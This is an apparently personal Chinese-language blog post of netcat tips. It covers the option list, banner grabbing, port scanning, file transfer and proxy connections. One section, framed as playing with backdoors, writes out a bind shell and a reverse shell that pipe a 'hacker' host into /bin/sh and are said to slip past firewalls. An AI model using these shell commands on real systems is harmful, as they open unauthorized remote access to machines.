---
layout: post
title: "Netcat/Nc命令使用技巧"
subtitle: "耍耍网络的瑞士军刀"
description: ""
category: Linux系统管理
author: "fishcried"
header-img: "img/bg/home-bg.jpg"
tags:
    - nc
    - netcat
    - 网络
    - linux
---

netcat网络安全界的“瑞士军刀”，简单实用。可以用来扫描端口，指纹探查，聊天，传输文件，后门等等，常常会有你意想不到的使用方式。

# 1. Netcat的常用选项

	-h			擦，记不住参数，就help啊
	-l			监听模式
	-p port		制定本地端口号
	-r			随机本地与远程端口
	-s addr		指定本地地址
	-C			使用CRLF换行方式
	-k			支持多链接 
	-e			绑定执行程序(后门),这个应该是特定版本才有
	-n			制定数字ip
	-v			输出详细信息，-vv更详细
	-w timeout	制定超时
	-z			端口扫描模式
	
# 2. 使用实例

## 2.1  连接远程主机端口

	test@test:~$ nc -nvv testip 21
	Connection to testip 21 port [tcp/*] succeeded!
	
	220 xxx FTP server ready.
	530 Please login with USER and PASS

通过这种方式，可以查看远程主机端口是否开启，甚至能够看到该端口运行的服务,也叫flag识别。也可以通过这种方式验证两台机器之间的通信是否被防火墙阻断。查看对断的端口是否开放。端口探测还是非常实用的。

## 2.2 端口扫描

	nc -nvv ip 20-30

## 2.3 两台设备之间通信

	nc -l 1234 > fname.out
	nc host.example.com 1234 < fname.in

两台机器之间可以通信了，那么可以做的事情太多了，一切都是数据，一切都可以传输 。无聊的话，也可以用来了把妹聊天。最好传输文件之前能把数据压缩加密，隐私什么的要注意的。

## 2.3 当后门来玩

	#正向连接后门
	target: nc -l -p 2345 -e /bin/sh
	hacker: nc target 2345
	
	#反向连接后门,容易突破防火墙
	hacker:
			nc -l -p 2345
			nc -l -p 2346
	target:	
			nc hacker 2345 | /bin/sh | nc hacker 2346

## 2.4 More

1. `nc -p 31337 -w5 host.example.com 80` : 使用本地31137端口连接host.example.com的80端口，5秒超时
1. `nc -u host.example.com 53`: dns探查
1. `nc -x10.2.3.4:8080 -Xconnect host.example.com 80` :使用代理方式连接对方80端口
1. `echo 'i found you' | nc -k -p  >> aha.log`:  有点密罐的意思

# 修改记录

|Why | Who | When |
|----|-----|------|
|整理旧文档|fishcired|2014-06-22|
